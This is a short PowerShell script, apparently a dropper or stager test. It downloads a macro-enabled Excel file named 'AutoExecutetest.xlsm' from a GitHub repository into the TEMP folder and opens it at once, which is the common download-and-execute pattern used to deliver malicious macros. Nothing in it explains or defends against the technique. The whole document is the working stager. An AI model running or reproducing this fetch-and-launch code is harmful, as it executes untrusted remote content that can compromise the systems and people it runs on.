$wc=New-Object System.Net.WebClient
$wc.DownloadFile("https://raw.githubusercontent.com/KONICHIVAA/TESTDRP/master/AutoExecutetest.xlsm", "$env:TEMP\AutoExecutetest.xlsm")
Start-Process "$env:TEMP\AutoExecutetest.xlsm"
